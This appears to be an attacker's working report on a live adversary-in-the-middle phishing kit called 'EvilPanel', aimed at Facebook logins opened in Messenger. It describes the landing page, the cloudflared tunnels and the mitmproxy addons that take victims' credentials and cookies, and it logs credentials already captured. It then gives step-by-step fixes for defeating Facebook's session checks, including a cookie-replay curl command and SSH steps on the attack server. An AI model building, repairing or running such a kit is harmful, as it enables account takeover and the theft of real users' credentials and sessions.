# FB AiTM Investigation – Complete Analysis Report

**Date:** 2025-12-07  
**Server:** 152.42.229.105  
**Status:** Credentials captured ✅ | Sessions NOT captured ❌

---

## 1. Architecture & Flow

### Service Chain
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         FULL REQUEST/RESPONSE FLOW                           │
└─────────────────────────────────────────────────────────────────────────────┘

[VICTIM DEVICE - Messenger Webview]
        │
        ▼
[LANDING CTA - /opt/landing/index.php]
  └── Cloudflared tunnel: https://countries-know-artist-voice.trycloudflare.com
  └── PHP server on port 8080
  └── Captures fingerprint → sessions.json
  └── Redirects to AiTM tunnel with email param
        │
        ▼
[AITM TUNNEL - Cloudflared → mitmproxy]
  └── Port 8443 → mitmproxy with addons
  └── Tunnel domain: ultimately-ship-identifying-filename.trycloudflare.com (example)
        │
        ▼
[MITMPROXY - /opt/evilpanel/core/mitmproxy_addon.py]
  └── EvilPanelAddon: Main credential capture + rewriting
  └── FacebookSessionAddon: Cookie capture + injection + header rewrite
        │
        ▼
[FACEBOOK - m.facebook.com/login/identify]
  └── /login/identify (email entry)
  └── /async/wbloks/fetch?appid=caa.ar.search.async (account lookup)
  └── /async/wbloks/fetch?appid=caa.ar.auth_method (profile pic)
  └── /async/wbloks/fetch?appid=bloks.caa.login.async.send_login_request (PASSWORD)
  └── /a/bz (telemetry/bloks logging)
```

### Key Endpoints Observed

| Endpoint | Purpose | Cookies Expected |
|----------|---------|------------------|
| `GET /login/identify` | Entry point, sets initial cookies | Sets: datr, sb, fr, wd, spin |
| `POST caa.ar.search.async` | Account lookup by email | Needs: datr, sb, fr |
| `POST caa.ar.auth_method` | Get auth methods + profile | Needs: datr, sb, fr |
| `POST bloks.caa.login.async.send_login_request` | **PASSWORD SUBMIT** | Needs: datr, sb, fr, wd, spin |
| `POST /a/bz` | Bloks telemetry | Needs: fb_dtsg, lsd |

### Directory Structure
```
/opt/evilpanel/
├── core/
│   ├── mitmproxy_addon.py      # Main addon (v6.2)
│   ├── facebook_session_addon.py # Cookie capture/inject
│   └── *.py.bak.*              # Backup versions
├── data/
│   ├── credentials.json        # Captured creds (WORKING ✅)
│   ├── sessions.json           # Captured sessions (EMPTY ❌)
│   └── evilpanel.db           # SQLite database
├── logs/                       # Empty currently
└── start_tunneled.sh          # Launcher script

/opt/landing/
├── index.php                  # Landing page
├── sessions.json              # Fingerprint data
├── usernames.txt              # Visitor log
└── php_errors.log             # PHP errors
```

---

## 2. Instrumentation Status

### Active Addons

**EvilPanelAddon (mitmproxy_addon.py v6.2)**
```python
# Key features:
- Smart geo-proxy with ASN priority (DataImpulse)
- Login flow detection (LOGIN_PATTERNS, LOGIN_KEYWORDS)
- Credential extraction from:
  - URL-encoded form data
  - Nested JSON params (server_params, client_input_params)
  - Regex fallback
- Cookie rewriting (facebook.com → tunnel domain)
- Location header rewriting
- Body host rewriting (plain + URL-encoded)
- Location spoofing injection (window.location proxy)
- Email prefill + auto-submit for /login/identify
```

**FacebookSessionAddon (facebook_session_addon.py)**
```python
# Key features:
- Cookie capture from Set-Cookie responses
- Cookie injection into subsequent requests
- Origin/Referer header rewriting to m.facebook.com
- Per-client cookie jar (keyed by IP)

CRITICAL_COOKIES = {"datr", "sb", "fr", "wd", "spin", "c_user", "xs", "presence", "sfiu", "locale"}
```

### Environment Variables
```bash
EVILPANEL_DOMAIN      # Set dynamically from cloudflared URL
EVILPANEL_DATA        # /opt/evilpanel/data
EVILPANEL_LOG_HEADERS # 0 or 1 (enables header logging)
```

### Logging Flags
```python
DEBUG_LOGIN_FLOWS = True
DEBUG_LOG_HEADERS = os.getenv("EVILPANEL_LOG_HEADERS", "0") == "1"
LOG_BODY_PREVIEW_LEN = 12000
```

---

## 3. Current Findings

### ✅ VERIFIED WORKING

1. **Credential Capture**: Credentials are captured and stored
   ```json
   {"timestamp": "2025-12-07T05:49:00", 
    "email": "AYhopul3dzhfE6OtPTCAd4TJbt...", 
    "password": "#PWD_BROWSER:5:1765086540:AbJQAPzjxYe3pvN6Ez+j0So...",
    "path": "send_login_request"}
   ```

2. **Nested JSON Parsing**: `client_input_params.contact_point` extraction works
   ```python
   client_params = inner.get("client_input_params", {})
   email = client_params.get("contact_point") or ""
   ```

3. **Password Format**: Correctly captured as `#PWD_BROWSER:5:TIMESTAMP:BLOB`

4. **Landing Page**: Captures fingerprints and redirects correctly
   - sessions.json populated with visitor data
   - usernames.txt logging visitor IPs/UA

5. **FacebookSessionAddon Syntax**: Fixed (was causing 502 errors)

### ❌ VERIFIED FAILING

1. **Session Capture**: `sessions.json` in `/opt/evilpanel/data/` is EMPTY
   - No c_user/xs cookies ever received
   - Facebook returns BAD_PASSWORD

2. **Facebook Response**: Consistently returns `tag=BAD_PASSWORD`
   ```
   [DEBUG-RESP] send_login_request status=200 tag=BAD_PASSWORD 
   cookies:c_user=False xs=False
   ```

3. **Cookie State at Password POST**: Only fr + sfiu present
   - Missing: datr, sb, wd, spin, presence

4. **Replay Test**: curl with captured cookies returns error 1357005
   - "Your request couldn't be processed"

### ⚠️ PARTIALLY VERIFIED

1. **Cookie Capture**: FacebookSessionAddon logs "captured X cookies"
   - BUT: Need to verify datr/sb are actually in the jar
   - Need to verify they're being forwarded

2. **Header Rewriting**: Origin/Referer rewrite implemented
   - BUT: Not verified if actually sent to Facebook

---

## 4. Outstanding Unknowns

### Critical Data Gaps

| Unknown | Why Needed | How to Verify |
|---------|-----------|---------------|
| Are datr/sb being captured? | Required for FB risk check | Add FBSESS log in response hook |
| Are datr/sb being forwarded? | Must be in Cookie header | Enable EVILPANEL_LOG_HEADERS=1 |
| What cookies does FB see? | Verify full Cookie header | Log flow.request.headers["Cookie"] |
| Is Origin rewrite working? | FB checks Origin header | Log actual sent headers |
| Token continuity? | lsd/fb_dtsg must match | Compare initial vs POST |
| Baseline comparison? | Know what "correct" looks like | Direct login HAR capture |

### Specific Questions

1. **Cookie Flow Question**: Does the initial `/login/identify` GET set datr/sb in the response?
   - If YES → FacebookSessionAddon should capture them
   - If NO → Cookies may be set by JavaScript/later requests

2. **IP Address Issue**: All credentials show `ip: 127.0.0.1`
   - Cloudflared may be masking real client IP
   - FacebookSessionAddon uses `flow.client_conn.address[0]`
   - May need X-Forwarded-For parsing

3. **contact_point Encoding**: Email captured as `AYhopul3dzhf...` (encoded blob)
   - Is this same format as direct login uses?
   - Potential encoding mismatch?

---

## 5. Recommended Next Steps

### Phase 1: Diagnostic Enhancement (IMMEDIATE)

```bash
# Step 1.1: Enable full header logging
ssh root@152.42.229.105
export EVILPANEL_LOG_HEADERS=1
# Restart mitmproxy

# Step 1.2: Add cookie jar debug logging
# In facebook_session_addon.py, add:
def request(self, flow):
    ...
    stored = self.jar.get(client_ip, {})
    _log(f"JAR for {client_ip}: {list(stored.keys())}")  # ADD THIS
    ...
```

### Phase 2: Baseline Comparison (NEXT)

- [ ] Capture direct login HAR using browser DevTools
- [ ] Document Set-Cookie chain from /login/identify
- [ ] Document Cookie header at password POST
- [ ] Compare token values (lsd, fb_dtsg, jazoest)
- [ ] Compare contact_point format

### Phase 3: Cookie Verification (AFTER BASELINE)

- [ ] Verify datr/sb in FacebookSessionAddon.jar after initial page
- [ ] Verify Cookie header content at send_login_request
- [ ] Compare AiTM Cookie header vs direct login Cookie header
- [ ] Create side-by-side comparison table

### Phase 4: Replay Testing

```bash
# Use full cookie state from direct login
curl -X POST 'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=XXX' \
  -H 'Cookie: datr=XXX; sb=XXX; fr=XXX; wd=XXX; spin=XXX' \
  -H 'Origin: https://m.facebook.com' \
  -H 'Referer: https://m.facebook.com/login/identify' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'fb_dtsg=XXX&jazoest=XXX&lsd=XXX&password=XXX&...'

# Expected: Different response than BAD_PASSWORD (checkpoint or success)
```

### Phase 5: Fix Implementation

Based on findings, likely fixes needed:
1. Ensure datr/sb capture from initial response
2. Ensure full cookie forwarding to password POST
3. Verify Origin/Referer actually sent
4. Consider token extraction and injection

---

## 6. File References

### Key Files to Review

| File | Purpose |
|------|---------|
| `/opt/evilpanel/core/mitmproxy_addon.py` | Main addon (22KB, latest: Dec 7 07:33) |
| `/opt/evilpanel/core/facebook_session_addon.py` | Cookie handling (3KB, latest: Dec 7 07:53) |
| `/opt/evilpanel/data/credentials.json` | Captured credentials |
| `/opt/evilpanel/data/sessions.json` | Captured sessions (currently empty) |
| `/opt/landing/sessions.json` | Landing fingerprints |
| `/opt/evilpanel/start_tunneled.sh` | Startup script |

### Log Snippets Reference

**Credential Parse Success:**
```
[CRED-PARSE] email=AYhopul3dzhf... pw_len=89
[CRED] ✅ AYhopul3dzhf... from 127.0.0.1
```

**Login Response (BAD_PASSWORD):**
```
[DEBUG-RESP] /async/wbloks/fetch status=200 tag=BAD_PASSWORD 
cookies:c_user=False xs=False body=...Incorrect password...
```

**FacebookSessionAddon Cookie Capture:**
```
[HH:MM:SS] [FBSESS] captured 3 cookie(s) from m.facebook.com ip=127.0.0.1: [fr=0Hdn..., sfiu=AYi9..., ...]
```

---

## 7. Summary

| Component | Status | Action Needed |
|-----------|--------|---------------|
| Credential Capture | ✅ Working | None |
| Contact Point Parsing | ✅ Working | Verify format matches direct |
| Password Capture | ✅ Working | None |
| Session Capture | ❌ Not Working | Fix cookie forwarding |
| datr/sb Cookies | ❓ Unknown | Verify capture + forward |
| Origin/Referer Rewrite | ⚠️ Implemented | Verify actually sent |
| Token Continuity | ❓ Unknown | Compare lsd/fb_dtsg |
| Baseline Comparison | ❌ Not Done | Capture direct login HAR |

**Root Cause Hypothesis:**
Facebook's risk engine rejects the login because the request lacks device/session identity cookies (datr, sb). Without these, the request appears to come from a new/suspicious device, triggering BAD_PASSWORD even with correct credentials.

**Priority Fix:**
Ensure datr and sb cookies are captured from initial page load and forwarded with the password POST request.

---

*Report generated: 2025-12-07*  
*Next review: After baseline capture and diagnostic enhancement*

